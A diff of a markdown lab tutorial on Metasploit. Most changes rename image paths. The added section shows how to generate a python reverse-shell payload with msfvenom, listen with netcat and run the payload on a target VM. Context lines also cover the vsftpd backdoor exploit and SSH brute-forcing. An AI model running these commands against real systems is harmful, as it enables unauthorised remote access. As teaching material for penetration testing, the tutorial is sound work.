@@ -45,7 +45,7 @@ e.g.,
 nmap -sn 192.168.64.0/24
 ```
 
-![](<../.gitbook/assets/image (3) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1).png>)
 
 Here, the flag `-sn` indicates that it uses ping to check whether the host exists or not. So if the host does not respond to pings, it won't be listed here. There are other flags that could be used, which you can find more from [>>here<<](https://nmap.org/book/man-briefoptions.html).
 
@@ -101,7 +101,7 @@ From the msfconsole, we can search for the identified service-related exploits
 use vsftpd
 ```
 
-![](<../.gitbook/assets/image (4) (1).png>)
+![](<../.gitbook/assets/image (4) (1) (1).png>)
 
 In fact, there is only one exploit (the backdoor one) available, so it will be automatically be selected. If it is not automatically selected, just type: `use 0` (i.e., the number 0th exploit) to select it.
 
@@ -117,7 +117,7 @@ Next, we need to check options to see what inputs the exploit requires.
 show options
 ```
 
-![](<../.gitbook/assets/image (2) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1).png>)
 
 The exploit is actually simple, and only requires the target host's IP address. So set the RHOST with the target IP address found using Nmap (the RPORT is already set, but if the FTP service runs on a different port or if the RPORT is not set, you can update/set it).
 
@@ -129,7 +129,7 @@ set RHOST 192.168.64.5
 
 All options are set, so now we can run the exploit by simply typing `run`.
 
-![](<../.gitbook/assets/image (2).png>)
+![](<../.gitbook/assets/image (2) (1).png>)
 
 {% hint style="info" %}
 The exploit may fail (as shown above), but you can simply run it again.
@@ -161,7 +161,7 @@ From Nmap scans, we know that the SSH service is running on port 22. However, it
 search ssh
 ```
 
-![](<../.gitbook/assets/image (4).png>)
+![](<../.gitbook/assets/image (4) (1).png>)
 
 ... But there are too many! So let's reduce the selection to `ssh_login`:
 
@@ -178,7 +178,7 @@ use 0
 show options
 ```
 
-![](<../.gitbook/assets/image (3).png>)
+![](<../.gitbook/assets/image (3) (1).png>)
 
 Like before, set the `RHOST` to be the target IP address. In addition, we must also provide the wordlist for username and password (you can either provide a single file that contains the pairs in `USERPASS_FILE`, or separately to try all pairs from the two files for `USER_FILE` and `PASS_FILE`). You can also read other option descriptions to change as necessary. For our bruteforce attack, we will use a `USERPASS_FILE` that comes with Metasploit.
 
@@ -234,17 +234,41 @@ Although we have technically improved the attack speed, we are still (at the end
 
 ### 1.2.3. Reverse Shell
 
+The Metasploit also comes with tools to create vulnerable executable scripts/files using `msfvenom` module. For our instance, we will create a reverse shell using python code:
+
+```
+msfvenom -p python/shell_reverse_tcp LHOST=[attacker IP address] LPORT=[attacker listening port]
+```
+
+![](<../.gitbook/assets/image (3).png>)
+
+The payload created is a python executable code, which you can execute from your victim host:
+
+{% hint style="info" %}
+For this exercise, I just cloned by Kali VM and used as the target. You can do similar, or run an existing VM and test also (should work on any OS).
+{% endhint %}
+
+But before you run the script (it will fail as you would have found out), you must first listen for activities from your attacker machine:
+
+```
+nc -lvnp 443
+```
+
+We set 443 to be the incoming port from the target host, so we listen on this port and wait until the target host executes the script. So now, let's execute the script from the target host:
+
+```
+python -c "[copy and paste payload here]"
+```
+
+![Left, you see the target host terminal. Right, you see the attacker terminal that got the reverse shell!](<../.gitbook/assets/image (4).png>)
+
+{% hint style="info" %}
+Such malicious payload can be created for various types of applications, not just Python (could be PHP, Java, .exe for Windows etc.). Also, there are many ways to hide such payload (masquerading, obfuscations etc.) – still a big issue today!
+{% endhint %}
+
+&#x20;Like the examples above, you can now search for other possible vulnerabilities and/or attacks and explore more about Metasploit!
 
 
 
-
-
-
-
-
-
-
-
-
-
+\--END--
 
